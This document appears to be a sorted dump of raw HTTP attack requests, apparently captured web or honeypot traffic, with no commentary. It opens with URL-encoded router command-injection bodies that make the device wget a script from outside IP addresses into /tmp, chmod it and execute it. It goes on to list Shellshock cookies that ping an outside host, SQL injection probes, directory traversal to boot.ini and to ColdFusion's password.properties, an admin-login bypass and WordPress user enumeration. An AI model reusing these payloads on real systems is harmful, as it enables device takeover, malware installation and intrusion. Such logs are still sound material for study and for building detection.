
\
\
%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%20%77%67%65%74%20%2d%4f%20%73%63%61%43%2e%73%68%20%68%74%74%70%3a%2f%2f%31%37%36%2e%31%30%33%2e%34%38%2e%33%34%2f%74%74%70%2f%74%74%70%2e%73%68%3b%20%63%68%6d%6f%64%20%2b%78%20%73%63%61%43%2e%73%68%3b%20%2e%2f%73%63%61%43%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%20%77%67%65%74%20%2d%4f%20%73%63%61%43%2e%73%68%20%68%74%74%70%3a%2f%2f%31%37%36%2e%31%30%33%2e%34%38%2e%33%34%2f%74%74%70%2f%74%74%70%32%2e%73%68%3b%20%63%68%6d%6f%64%20%2b%78%20%73%63%61%43%2e%73%68%3b%20%2e%2f%73%63%61%43%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2d%66%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%6e%74%74%70%64%20%68%74%74%70%3a%2f%2f%31%32%2e%31%38%33%2e%35%30%2e%32%32%3a%33%33%34%34%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%2e%73%68%3b%2e%2f%2e%6e%74%74%70%64%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2d%66%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%6e%74%74%70%64%20%68%74%74%70%3a%2f%2f%32%31%38%2e%32%35%30%2e%32%32%36%2e%31%38%3a%33%33%34%34%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%2e%73%68%3b%2e%2f%2e%6e%74%74%70%64%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2d%66%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%6e%74%74%70%64%20%68%74%74%70%3a%2f%2f%36%31%2e%36%2e%30%2e%31%39%30%3a%33%33%34%34%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%2e%73%68%3b%2e%2f%2e%6e%74%74%70%64%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%27%23%21%2f%62%69%6e%2f%73%68%27%20%3e%20%31%2e%73%68%3b%65%63%68%6f%20%27%77%67%65%74%20%2d%4f%20%32%2e%73%68%20%68%74%74%70%3a%2f%2f%31%37%36%2e%31%30%33%2e%34%38%2e%33%34%2f%74%74%70%2f%74%74%70%2e%73%68%27%20%3e%3e%20%31%2e%73%68%3b%65%63%68%6f%20%27%63%68%6d%6f%64%20%2b%78%20%32%2e%73%68%27%20%3e%3e%20%31%2e%73%68%3b%65%63%68%6f%20%27%2e%2f%32%2e%73%68%27%20%3e%3e%20%31%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%31%2e%73%68%3b%2e%2f%31%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
a
Accept: */*\
Accept-Charset: GBK\,utf-8;q=0.7\,*;q=0.3\
Accept-Charset: ISO-8859-1\,utf-8;q=0.7\,*;q=0.7\
Accept-Encoding: deflate\, gzip\, identity\
Accept-Encoding: gzip\
Accept-Encoding: gzip\, deflate\
Accept-Encoding: identity\
Accept-Encoding: none\
Accept: image/gif\, image/jpeg\, image/pjpeg\, image/pjpeg\, application/x-shockwave-flash\, application/x-ms-application\, application/x-ms-xbap\, application/vnd.ms-xpsdocument\, application/xaml+xml\, */*\
Accept-Language: en-us\
Accept-Language: en-us\,en;q=0.5\
Accept-Language: en-US;q=0.6\,en;q=0.4\
Accept-Language: pl\,en-US;q=0.7\,en;q=0.3\
Accept-Language: zh-cn\
Accept-Language: zh-cn\,zh;q=0.8\
Accept: text/*\
Accept: text/html\,application/xhtml+xml\,application/xml;q=0.9\,*/*;q=0.8\
Accept: text/html\, image/gif\, image/jpeg\, *; q=.2\, */*; q=.2\
Authorization: Basic YWRtaW46\
Cache-Control: max-age=0\
Cache-Control: max-age=259200\
Cache-Control: no-cache\
comment=%27%20OR%20sqlspider
comment=ghz%3ehzx
comment=hzx%22zxc
comment=zxc%27xcv
Connection: close
Connection: close\
Connection: Close\
Connection: keep-alive\
Connection: Keep-Alive\
Connection: TE\, close\
Content-Length: 0\
Content-Length: 1\
Content-Length: 100\
Content-Length: 105\
Content-Length: 15\
Content-Length: 17\
Content-Length: 188\
Content-Length: 26\
Content-Length: 28\
Content-Length: 395\
Content-Length: 52\
Content-Length: 520\
Content-Length: 523\
Content-Length: 754\
Content-Length: 86\
Content-Length: 934\
Content-Length: 940\
Content-Length: 946\
Content-Type: application/xml\
Content-Type: application/x-www-form-urlencoded\
Content-Type: text/html\
Cookie: () { :;}; /bin/bash -c "ping 212.47.238.143 -c 1"\
Cookie: () { :;}; echo; echo "HWNDLGZZCPPYGWD"\
() {: ;}; echo; echo "HWNDLGZZCPPYGWD": () { :;}; echo; echo "HWNDLGZZCPPYGWD"\
Expect: 100-continue\
GET /19a7065f9aacf4e2811a29e43bcf4b96d56154a0.htm HTTP/1.1\
GET /%2Ainc%2A.php?base_dir=%27%20OR%20sqlspider HTTP/1.1\
GET /%2Ainc%2A.php?get=%27%20OR%20sqlspider HTTP/1.1\
GET /%2Ainc%2A.php?m=%27%20OR%20sqlspider HTTP/1.1\
GET /%2A.php?inf=%27%20OR%20sqlspider HTTP/1.1\
GET /%2A.php?mode=%27%20OR%20sqlspider HTTP/1.1\
GET /%2A.php?mode= HTTP/1.1\
GET /%2A.php?pg=%27%20OR%20sqlspider HTTP/1.1\
GET /..%5C..%5C..%5C..%5C%5C..%5C..%5C%5C..%5C..%5C%5C%5Cboot.ini HTTP/1.1\
GET /..%5C..%5C%5C..%5C..%5C%5C..%5C..%5C%5C..%5C..%5Cboot.ini HTTP/1.1\
GET /..%5C/%5C..%5C/%5C..%5C/%5Cboot.ini HTTP/1.1\
GET ////..%5C..%5C..%5Cboot.ini HTTP/1.1\
GET /..%5C/..%5C/..%5C/boot.ini HTTP/1.1\
GET /%5C../%5C../%5C../boot.ini HTTP/1.1\
GET /%5C HTTP/1.1\
GET /adcycle HTTP/1.1\
GET /add.asp?bookid=%27%20OR%20sqlspider HTTP/1.1\
GET /administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_live_site=%27%20OR%20sqlspider HTTP/1.1\
GET /administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path=%27%20OR%20sqlspider HTTP/1.1\
GET /admin.php?page=%27%20OR%20sqlspider HTTP/1.1\
GET /advSearch_h.asp?idCategory=%27%20OR%20sqlspider HTTP/1.1\
GET /affiliate-agreement.cfm?storeid=%27%20OR%20sqlspider HTTP/1.1\
GET /agenda.php?t=%27%20OR%20sqlspider HTTP/1.1\
GET /aktuelles.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /ansprechpartner.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /artigos.php?tipo=%27%20OR%20sqlspider HTTP/1.1\
GET /artikel.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /ashnews.php?pathtoashnews=%27%20OR%20sqlspider HTTP/1.1\
GET /assistenza.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /?author=10 HTTP/1.1\
GET /?author=11 HTTP/1.1\
GET /?author=12 HTTP/1.1\
GET /?author=13 HTTP/1.1\
GET /?author=14 HTTP/1.1\
GET /?author=15 HTTP/1.1\
GET /?author=16 HTTP/1.1\
GET /?author=17 HTTP/1.1\
GET /?author=18 HTTP/1.1\
GET /?author=19 HTTP/1.1\
GET /?author=1 HTTP/1.1\
GET /?author=20 HTTP/1.1\
GET /?author=21 HTTP/1.1\
GET /?author=22 HTTP/1.1\
GET /?author=23 HTTP/1.1\
GET /?author=24 HTTP/1.1\
GET /?author=25 HTTP/1.1\
GET /?author=2 HTTP/1.1\
GET /?author=3 HTTP/1.1\
GET /?author=4 HTTP/1.1\
GET /?author=5 HTTP/1.1\
GET /?author=6 HTTP/1.1\
GET /?author=7 HTTP/1.1\
GET /?author=8 HTTP/1.1\
GET /?author=9 HTTP/1.1\
GET /axis2/services/listServices HTTP/1.1\
GET /b2-tools/gm-2-b2.php?b2inc=%27%20OR%20sqlspider HTTP/1.1\
GET /base.php?ir=%27%20OR%20sqlspider HTTP/1.1\
GET /base.php?k=%27%20OR%20sqlspider HTTP/1.1\
GET /base.php?pa=%27%20OR%20sqlspider HTTP/1.1\
GET /base.php?pageweb=%27%20OR%20sqlspider HTTP/1.1\
GET /base.php?pa= HTTP/1.1\
GET /base.php?rub=%27%20OR%20sqlspider HTTP/1.1\
GET /base.php?sivu=%27%20OR%20sqlspider HTTP/1.1\
GET /becommunity/community/index.php?pageurl=%27%20OR%20sqlspider HTTP/1.1\
GET /blank.php?abre=%27%20OR%20sqlspider HTTP/1.1\
GET /blank.php?channel=%27%20OR%20sqlspider HTTP/1.1\
GET /blank.php?channel= HTTP/1.1\
GET /blank.php?h=%27%20OR%20sqlspider HTTP/1.1\
GET /blank.php?menu=%27%20OR%20sqlspider HTTP/1.1\
GET /blank.php?OpenPage=%27%20OR%20sqlspider HTTP/1.1\
GET /blank.php?pagina=%27%20OR%20sqlspider HTTP/1.1\
GET /blank.php?pr=%27%20OR%20sqlspider HTTP/1.1\
GET /blank.php?qry=%27%20OR%20sqlspider HTTP/1.1\
GET /blank.php?url=%27%20OR%20sqlspider HTTP/1.1\
GET /blog//wp-login.php HTTP/1.1\
GET ///../../../../boot.ini HTTP/1.1\
GET /Browse_Item_Details.asp?Store_Id=%27%20OR%20sqlspider HTTP/1.1\
GET /buy.asp?=%27%20OR%20sqlspider HTTP/1.1\
GET /bycategory.asp?id=%27%20OR%20sqlspider HTTP/1.1\
GET /calendario.php?dia=%27%20OR%20sqlspider HTTP/1.1\
GET /candidate.php?ID=%27%20OR%20sqlspider HTTP/1.1\
GET /cars.php?page=%27%20OR%20sqlspider HTTP/1.1\
GET /cars.php?page= HTTP/1.1\
GET /cart.asp?cart_id=%27%20OR%20sqlspider HTTP/1.1\
GET /catalog_main.asp?catid=%27%20OR%20sqlspider HTTP/1.1\
GET /cd.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /CFIDE/adminapi/administrator.cfc?method=login&adminpassword=&rdsPasswordAllowed=true HTTP/1.1\
GET /CFIDE/administrator/enter.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\CFusionMX7\\lib\\password.properties%00en HTTP/1.1\
